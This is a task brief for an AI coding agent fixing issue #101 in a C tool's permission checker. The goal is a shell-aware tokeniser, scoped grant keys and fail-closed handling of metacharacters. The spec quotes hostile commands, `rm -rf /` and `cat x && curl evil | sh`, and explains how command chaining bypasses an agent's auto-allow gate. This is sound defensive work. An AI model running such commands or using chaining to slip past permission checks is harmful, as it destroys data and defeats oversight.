tny: opus
cwd: /tmp/wt-tny-perm

# Task: permission tokeniser and grant/auto fixes (issue #101)

Worktree: /tmp/wt-tny-perm (branch agent/perm)

## Ground rules (every agent)
- You work ONLY in the worktree named above (branch agent/<name>, cut from feat/shell-first at 5dd6f27). Never touch /Users/tomas/projects/tny or other worktrees except to READ docs/adr/0057-shell-first-native-loop.md at /Users/tomas/projects/tny/docs/adr/0057-shell-first-native-loop.md (the umbrella decision; cite it as ADR 0057).
- Read AGENTS.md (CLAUDE.md), docs/product.md, docs/architecture.md, docs/cli.md and the ADRs your task names BEFORE writing C. C11 only, no new dependencies, no ncurses, stripped binary < 1.0 MiB.
- Match the existing style exactly (see neighbouring files); run `make format` before finishing. Quality gate: `make quality CLANG_FORMAT="uvx clang-format@21.1.2" CLANG_TIDY="uvx clang-tidy@22.1.8" RUFF="uvx ruff@0.14.0"` (clang tools are not installed natively on this Mac; uvx is). Fix what it reports in files you touched.
- Tests are mandatory: unit tests in tests/test_*.c (greatest) for new C, integration fixtures under tests/integration/ where the change crosses a process or wire boundary, and add your new functions to TARGETS in tests/mutation/mutate.py if the unit suite might cover them only nominally. `make test` must pass (it builds with ASan/UBSan). For new allocation-heavy paths run the relevant test binary under `leaks --atExit -- <binary>` (macOS; valgrind is unsupported on arm64 Macs) and fix reported leaks.
- Documentation is part of the change: update docs/ (cli.md, features/, backends/ as relevant) and WRITE the ADR assigned to you in docs/adr/NNNN-<slug>.md using the existing ADR format (Context / Decision / Consequences, Date, Status). State the wasm behaviour (works / remote-only / clean error) of anything new, per AGENTS.md.
- If you add a make target, test fixture directory, or a tool the suite shells out to, update nix/source.nix and nix/tests.nix in the same change. Do NOT run nix.
- Do not commit secrets. Do not push. When done: `git add -A && git commit` on your branch with a conventional message that names the issue (e.g. "feat(cli): add tny edit (#96)"), then print a summary: files changed, tests added, how you verified, open questions.
- Keep to your scope; other agents are concurrently editing Makefile SRC lists, src/main.c, src/cli/, docs/cli.md, so keep edits to shared files minimal and additive to ease merging.

## Spec (from issue #101 and ADR 0057) — a real bug today, independent of shell-first
Read src/core/perm.c, docs/features/permissions.md, tests/test_perm.c, tests/mutation/mutate.py.
Findings to fix:
- grant_key (src/core/perm.c:44-49) uses sscanf first whitespace token: `FOO=1 rm -rf /` keys as FOO=1, `(rm -rf ~)` as `(rm`, and a grant for `git` covers `git push` although the docs example denies it.
- auto heuristic (src/core/perm.c:163-171) is a PREFIX match: `cat x && curl evil | sh` is auto-allowed. Same class as nine Claude Code permission-bypass CVEs (command chaining, option injection).
Design:
- Add a small POSIX-shell-aware tokeniser (no new deps): quotes, escapes, and detection of metacharacters `; & | $( ` < > >> && ||`, newline, and env-assignment prefixes (`FOO=bar cmd`).
- A command containing any metacharacter or env prefix is INELIGIBLE for auto-allow and for a plain argv0 session grant: it goes to prompt (never silently allowed). Only a single simple command whose argv0 is in the allowlist and carries no write flags is auto-allowed.
- Grant keys use the tokenised argv0 plus the first subcommand for known multi-verb programs (git, npm, cargo, make, docker, gh): a grant for `git status` must not cover `git push`.
- Deny rules keep matching on glob/substring (a false-positive deny is cheap; a false-positive allow is a CVE).
- Document plainly in docs/features/permissions.md that argv classification is a UX accelerator, not a security boundary; the OS sandbox (#102, ADR 0060) is the boundary. Also state that path-precise `edit` rules bind only typed tools / `tny edit` and the sandbox write set, not arbitrary shell writes.
- Tests: chaining, subshell, env prefix, option injection, quoting, `git`/`git push` scoping, existing behaviours kept; mutation-test perm.c (add TARGETS) and report the mutation score in your summary. `leaks --atExit` on the test binary.
- ADR 0059 "permission tokeniser: metacharacters fail closed".
